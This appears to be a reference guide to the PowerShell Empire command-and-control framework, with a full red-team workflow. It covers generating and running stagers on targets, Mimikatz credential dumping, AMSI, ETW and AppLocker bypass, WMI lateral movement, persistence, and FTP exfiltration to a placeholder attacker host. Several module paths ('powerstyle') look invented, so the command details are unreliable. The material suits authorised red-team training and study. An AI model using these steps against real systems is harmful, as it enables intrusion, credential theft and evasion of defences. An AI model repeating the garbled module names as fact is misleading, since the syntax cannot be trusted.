---
tool_name: "powershell-empire"
display_name: "PowerShell Empire"
mitre_tactic: "command_and_control"
mitre_tactic_id: "TA0011"
mitre_subcategory: "c2_frameworks"
install_command: "git clone --recursive https://github.com/BC-SECURITY/Empire.git"
version: "6.6.0"
github_repo: "https://github.com/BC-SECURITY/Empire"
kali_tools_page: "https://www.kali.org/tools/empire/"
difficulty_level: "intermediate-to-advanced"
requires_root: true
gui_available: true
tags: ["c2", "powershell", "post-exploitation", "red-team", "adversary-emulation", "starkiller"]
related_tools: ["starkiller", "metasploit-framework", "cobalt-strike"]
---

# PowerShell Empire

## Chapter 1: Introduction & Overview

### What is PowerShell Empire?
PowerShell Empire is a post-exploitation and adversary emulation framework used to aid Red Teams and Penetration Testers. The Empire server is written in Python 3 and is modular to allow operator flexibility. It features a client/server architecture with full encryption, multiple listener types, and a massive library of 400+ post-exploitation tools in PowerShell, C#, and Python.

### History & Background
- **Created:** 2015 by EmpireProject
- **Maintained:** BC-SECURITY (5.2k stars, 690 forks)
- **License:** BSD-3-Clause
- **Purpose:** Post-exploitation, adversary emulation, red team operations

PowerShell Empire was originally created as a PowerShell-only framework but has evolved to support multiple agent types (PowerShell, Python, C#, IronPython, Go) and includes features like Donut integration for shellcode generation, integrated Roslyn compiler, and JA3/JARM evasion.

### When to Use This Tool
- **Red team engagements:** Full-spectrum adversary emulation
- **Penetration testing:** Post-exploitation activities on Windows, Linux, macOS
- **Adversary emulation:** Simulating real-world threat actors
- **Purple team exercises:** Testing detection and response capabilities

### When NOT to Use This Tool
- Without explicit written authorization from the target organization
- On production systems without proper planning
- When a simpler tool would suffice
- For unauthorized access or malicious activity

### Legal and Ethical Considerations
- **Always obtain written permission** before deploying Empire
- **Understand the scope** - know exactly what systems you are authorized to access
- **Use encryption** - Empire provides encrypted communications by default
- **Document all activity** - maintain records of all access obtained
- **Clean up** - remove all artifacts after engagement completion

### Key Concepts
- **Listener:** Server-side component that accepts connections from agents
- **Agent:** Implant running on the target (PowerShell, Python, C#, etc.)
- **Module:** Post-exploitation capability (400+ available)
- **Stager:** Initial payload used to download and execute an agent
- **Bypass:** Techniques to evade detection (AMSI, ETW, etc.)

---

## Chapter 2: Installation & Setup

### System Requirements
- **Minimum RAM:** 2 GB (4 GB recommended)
- **Disk Space:** 500 MB for full install
- **OS:** Kali Linux, ParrotOS, Ubuntu 22.04/24.04, Debian 11/12/13
- **Python:** 3.x
- **Privileges:** Root required for server operations

### Installation Methods

#### Method 1: From Source (Recommended)
```bash
# Clone with submodules
git clone --recursive https://github.com/BC-SECURITY/Empire.git
cd Empire

# Checkout latest stable release
./setup/checkout-latest-tag.sh

# Install dependencies
./ps-empire install -y
```

#### Method 2: Docker
```bash
# Build the Docker image
docker build -t empire .

# Run Empire
docker run -it -p 1337:1337 empire
```

### Starting Empire
```bash
# Start the server
./ps-empire server

# Connect with the client (in another terminal)
./ps-empire client
```

### Database Setup
```bash
# Empire uses SQLite by default (no setup required)
# For PostgreSQL:
# Edit empire/config/empire.yml
# Set database type and connection details
```

---

## Chapter 3: Core Concepts

### Architecture Overview
Empire uses a client/server architecture:
- **Server:** Python 3-based C2 server managing listeners, agents, and modules
- **Client:** Command-line interface for operator interaction
- **Starkiller:** Web-based GUI for remote management
- **Database:** SQLite or PostgreSQL for persistence

### Agent Types
- **PowerShell:** Classic Empire agent (in-memory .NET execution)
- **Python 3:** Cross-platform agent for Linux/macOS
- **C# (.NET):** Compiled .NET assemblies via Roslyn
- **IronPython 3:** Python on .NET runtime
- **Go:** Compiled Go binaries for portability

### Listener Types
- **HTTP/S:** Standard web-based listeners
- **Malleable HTTP:** Cobalt Strike-compatible profiles
- **OneDrive:** Cloud-based listeners
- **Dropbox:** Cloud storage-based listeners
- **PHP:** PHP-based listeners

### Communication Flow
```
Operator -> Client/Server -> Listener -> Agent (Target)
Agent (Target) -> Listener -> Server -> Operator
```

### Module Categories
- **Execution:** Code execution methods
- **Credential Access:** Password dumping, token manipulation
- **Privilege Escalation:** UAC bypass, token impersonation
- **Lateral Movement:** Remote execution techniques
- **Persistence:** Registry, scheduled tasks, WMI
- **Defense Evasion:** AMSI bypass, obfuscation

---

## Chapter 4: Basic Usage

### Starting the Server
```bash
cd Empire
./ps-empire server
```

### Connecting with Client
```bash
cd Empire
./ps-empire client

# Default credentials:
# Username: empireadmin
# Password: password123
```

### Setting Up a Listener
```bash
# In the Empire client:
(Empire) > listeners

(Empire: listeners) > uselistener http

(Empire: listeners/http) > set Host http://192.168.1.100:8080
(Empire: listeners/http) > set Port 8080
(Empire: listeners/http) > execute

# List active listeners
(Empire) > listeners
```

### Generating a Stager
```bash
# Generate a PowerShell stager
(Empire) > usestager multi/launcher
(Empire: stager/multi/launcher) > set Listener http
(Empire: stager/multi/launcher) > generate

# Copy the output and execute on target
```

### Interacting with Agents
```bash
# List active agents
(Empire) > agents

# Interact with an agent
(Empire) > interact <agent_name>

# Execute commands
(Empire: <agent_name>) > shell whoami
(Empire: <agent_name>) > shell hostname
(Empire: <agent_name>) > download C:\Users\target\file.txt
```

---

## Chapter 5: Advanced Usage

### Post-Exploitation Modules
```bash
# Use a module
(Empire) > usemodule powershell/situational_awareness/network/portscan

(Empire: module/powershell/situational_awareness/network/portscan) > set RHOSTS 10.0.0.0/24
(Empire: module/powershell/situational_awareness/network/portscan) > set Agent <agent_name>
(Empire: module/powershell/situational_awareness/network/portscan) > execute
```

### Common Modules
```bash
# Mimikatz credential dumping
usemodule powershell/credentials/mimikatz/logonpasswords

# Seatbelt system survey
usemodule powershell/situational_awareness/host/seatbelt

# Rubeus Kerberos operations
usemodule powershell/kerberos/rubeus/asktgt

# SharpSploit lateral movement
usemodule powershell/lateral_movement/invoke_smbexec
```

### Bypass Techniques
```bash
# AMSI bypass
usemodule powershell/management/bypass_amsi

# ETW bypass
usemodule powershell/management/bypass_etw

# AppLocker bypass
usemodule powershell/management/bypass_applocker
```

### Custom Agents
```bash
# Generate a custom agent
(Empire) > usestager multi/bash
(Empire: stager/multi/bash) > set Listener http
(Empire: stager/multi/bash) > generate

# Generate a DLL agent
(Empire) > usestager windows/dll
(Empire: stager/windows/dll) > set Listener http
(Empire: stager/windows/dll) > generate
```

---

## Chapter 6: Integration & Automation

### Starkiller Integration
Starkiller is the web-based GUI for Empire:
```bash
# As of Empire 5.0, Starkiller is bundled
# Access at: http://localhost:1337

# Or install separately:
git clone https://github.com/BC-SECURITY/Starkiller.git
cd Starkiller
yarn install
yarn dev
```

### REST API
Empire exposes a REST API for automation:
```bash
# Authenticate
curl -X POST http://127.0.0.1:1337/api/auth -d '{"username":"empireadmin","password":"password123"}'

# List agents
curl -H "Authorization: Bearer <token>" http://127.0.0.1:1337/api/agents

# Execute module
curl -X POST -H "Authorization: Bearer <token>" http://127.0.0.1:1337/api/agents/<agent>/execute -d '{"module":"powershell/credentials/mimikatz/logonpasswords"}'
```

### Scripting Empire
```python
# Example Python script using Empire API
import requests

# Authenticate
r = requests.post('http://127.0.0.1:1337/api/auth', json={'username':'empireadmin','password':'password123'})
token = r.json()['token']

# List agents
r = requests.get('http://127.0.0.1:1337/api/agents', headers={'Authorization': f'Bearer {token}'})
print(r.json())
```

### Integration with Other Tools
- **Starkiller:** Web GUI for Empire management
- **Metasploit:** Use Metasploit for initial access, then Empire for post-exploitation
- **Cobalt Strike:** Convert Empire modules for use in Cobalt Strike
- **Custom modules:** Extend Empire with PowerShell, C#, or Python modules

---

## Chapter 7: OPSEC & Defense Evasion

### Agent Evasion
- **In-memory execution:** No files written to disk
- **AMSI bypass:** Disable Antimalware Scan Interface
- **ETW bypass:** Disable Event Tracing for Windows
- **Obfuscation:** Use ConfuserEx 2 and Invoke-Obfuscation
- **JA3/JARM evasion:** Avoid TLS fingerprint detection

### Bypass Techniques
```bash
# AMSI bypass
usemodule powershell/management/bypass_amsi

# ETW bypass
usemodule powershell/management/bypass_etw

# Use obfuscation
(Empire) > set obfuscation True
```

### Best Practices
1. Always use encrypted listeners (HTTPS)
2. Implement sleep jitter to avoid pattern detection
3. Use malleable profiles to mimic legitimate traffic
4. Test agents against AV/EDR before deployment
5. Rotate infrastructure regularly

### C2 Profile Customization
```yaml
# Malleable C2 profile example
set MalleableProfile http_malleable.profile
```

---

## Chapter 8: Troubleshooting & FAQ

### Common Issues

**Problem: Server won't start**
```bash
# Check Python version
python3 --version

# Reinstall dependencies
cd Empire && ./ps-empire install -y

# Check for port conflicts
netstat -tlnp | grep 1337
```

**Problem: Agent doesn't connect**
- Verify the listener is running and accessible
- Check firewall rules on the C2 server
- Ensure the stager is executed correctly on the target
- Test network connectivity

**Problem: Modules fail to execute**
- Verify the agent is still active
- Check that required dependencies are installed on target
- Look for error messages in the console
- Test with simpler modules first

**Problem: AMSI detection**
- Use built-in AMSI bypass module
- Apply Invoke-Obfuscation to payloads
- Use C# or Python agents instead of PowerShell

### Debug Mode
```bash
# Start server with verbose output
./ps-empire server -v

# Check Empire logs
tail -f empire/logs/empire.log
```

---

## Chapter 9: Real-World Scenarios

### Full Red Team Engagement Workflow

```bash
# 1. Start HTTPS listener
(Empire: listeners) > uselistener http
(Empire: listeners/http) > set Host https://redirector.example.com
(Empire: listeners/http) > set Port 443
(Empire: listeners/http) > set CertPath /path/to/cert.pem
(Empire: listeners/http) > execute

# 2. Generate stager for initial access
(Empire) > usestager windows/hta
(Empire: stager/windows/hta) > set Listener http
(Empire: stager/windows/hta) > generate

# 3. Once agent connects, enumerate
(Empire: agent) > shell whoami /all
(Empire: agent) > shell systeminfo
(Empire: agent) > usemodule powershell/situational_awareness/host/seatbelt
(Empire: module/...) > set Agent <agent_name>
(Empire: module/...) > execute

# 4. Credential harvesting
(Empire: agent) > usemodule powershell/credentials/mimikatz/logonpasswords
(Empire: module/...) > execute

# 5. Lateral movement
(Empire: agent) > usemodule powershell/lateral_movement/invoke_wmiexec
(Empire: module/...) > set ComputerName 10.0.0.50
(Empire: module/...) > set Listener http
(Empire: module/...) > execute
```

### Persistence Mechanisms

```bash
# Registry persistence
(Empire: agent) > usemodule persistence/powerstyle/registry
(Empire: module/...) > execute

# Scheduled task persistence
(Empire: agent) > usemodule persistence/powerstyle/schtasks
(Empire: module/...) > execute

# WMI event subscription
(Empire: agent) > usemodule persistence/powerstyle/wmi
(Empire: module/...) > execute
```

### Data Exfiltration

```bash
# Download files from target
(Empire: agent) > download C:\Users\target\Documents\secrets.xlsx

# Use exfil modules
(Empire: agent) > usemodule exfil/powerstyle/ftp
(Empire: module/...) > set FTPHost ftp.attacker.com
(Empire: module/...) > set FTPUser exfil
(Empire: module/...) > set FTPPass password
(Empire: module/...) > execute
```

---

## Chapter 10: Empire Configuration Deep Dive

### Configuration File

```yaml
# empire/config/empire.yml
---
defaults:
  database_type: sqlite
  database_connection_string: "data/empire.db"
  install_path: "/opt/Empire"
  api_host: "127.0.0.1"
  api_port: 1337
  staging_key: "random_staging_key"
  obfuscation: true
  obfuscation_command: "Invoke-Obfuscation"
  disable_logging: false
```

### Custom Staging Key

```bash
# Set a custom staging key for OPSEC
./ps-empire server --staging-key MyCustomKey123

# Use the same key when generating stagers
(Empire: stager) > set StagingKey MyCustomKey123
```

### Database Migration

```bash
# Migrate from SQLite to PostgreSQL
# 1. Update empire/config/empire.yml
database_type: postgres
database_connection_string: "postgresql://user:pass@localhost:5432/empire"

# 2. Restart Empire
./ps-empire server
```

---

## Resources

- **GitHub Repository:** https://github.com/BC-SECURITY/Empire
- **Kali Tools Page:** https://www.kali.org/tools/empire/
- **Empire Documentation:** https://bc-security.gitbook.io/empire-wiki/
- **Starkiller:** https://github.com/BC-SECURITY/Starkiller
- **MITRE ATT&CK - Command and Control:** https://attack.mitre.org/tactics/TA0011/
- **MITRE ATT&CK - PowerShell:** https://attack.mitre.org/techniques/T1059/001/
- **MITRE ATT&CK - Ingress Tool Transfer:** https://attack.mitre.org/techniques/T1105/
- **MITRE ATT&CK - Server Software Component:** https://attack.mitre.org/techniques/T1505/
- **Related Tools:** Starkiller, Metasploit Framework, Cobalt Strike
